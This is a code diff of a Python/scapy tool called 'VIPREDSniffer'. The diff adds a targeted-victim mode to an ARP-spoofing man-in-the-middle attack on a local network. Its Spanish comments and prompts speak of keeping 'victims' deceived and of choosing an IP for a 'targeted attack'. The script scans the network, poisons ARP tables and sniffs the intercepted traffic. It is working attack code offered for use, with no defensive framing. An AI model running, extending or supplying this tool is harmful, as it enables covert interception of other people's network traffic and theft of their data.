@@ -1,3 +1,5 @@
+#VIPREDSniffer
+
 from scapy.all import sniff, IP, TCP, Raw, IFACES, ARP, Ether, sendp, srp, get_if_hwaddr
 from urllib.parse import unquote_plus
 import re
@@ -295,7 +297,7 @@ def restaurar(dispositivos, gateway, mac_gateway, interfaz):
         sendp([p1, p2], iface=interfaz, count=5, verbose=False)
 
 
-def hilo_interceptar_red(interfaz, mi_ip, gateway, rango):
+def hilo_interceptar_red(interfaz, mi_ip, gateway, rango, objetivo_ip=""):
     # Este hilo se ejecuta en segundo plano. Mantiene a las víctimas engañadas.
     mi_mac = get_if_hwaddr(interfaz)
     print(f"[*] Preparando intercepción invisible (ARP Spoofing)...")
@@ -305,7 +307,20 @@ def hilo_interceptar_red(interfaz, mi_ip, gateway, rango):
         print("[!] Fallo crítico: No se encontró el gateway.")
         return
 
-    dispositivos = escanear_red(rango, interfaz, mi_ip, gateway)
+    dispositivos_encontrados = escanear_red(rango, interfaz, mi_ip, gateway)
+    
+    if objetivo_ip:
+        dispositivos = [d for d in dispositivos_encontrados if d["ip"] == objetivo_ip]
+        if not dispositivos:
+            mac_obj = obtener_mac(objetivo_ip, interfaz)
+            if mac_obj:
+                dispositivos = [{"ip": objetivo_ip, "mac": mac_obj}]
+            else:
+                print(f"[!] No se encontró la IP {objetivo_ip}. Intercepción abortada.")
+                return
+    else:
+        dispositivos = dispositivos_encontrados
+
     if not dispositivos:
         print("[!] No hay dispositivos para interceptar.")
         return
@@ -315,7 +330,7 @@ def hilo_interceptar_red(interfaz, mi_ip, gateway, rango):
     ciclos = 0
     try:
         while True:
-            if ciclos % 30 == 0 and ciclos != 0:
+            if not objetivo_ip and ciclos % 30 == 0 and ciclos != 0:
                 nuevos = escanear_red(rango, interfaz, mi_ip, gateway)
                 ips_actuales = {d["ip"] for d in dispositivos}
                 for d in nuevos:
@@ -349,10 +364,17 @@ def main():
     # 2. Descubrir la red
     gateway, rango = detectar_red_completa(mi_ip)
     
+    print("\n" + "="*55)
+    print(" [?] MODO DE INTERCEPCIÓN")
+    print("     Presiona ENTER para escuchar a TODA LA RED.")
+    print("     O escribe una IP específica (Ej: 192.168.1.15) para un ataque dirigido.")
+    print("="*55)
+    objetivo_ip = input("\n[>] Tu elección: ").strip()
+
     # 3. Lanzar el interceptor ARP (Ataque Man-in-the-Middle) en un hilo paralelo
     t_interceptor = threading.Thread(
         target=hilo_interceptar_red, 
-        args=(INTERFAZ, mi_ip, gateway, rango)
+        args=(INTERFAZ, mi_ip, gateway, rango, objetivo_ip)
     )
     t_interceptor.daemon = True
     t_interceptor.start()
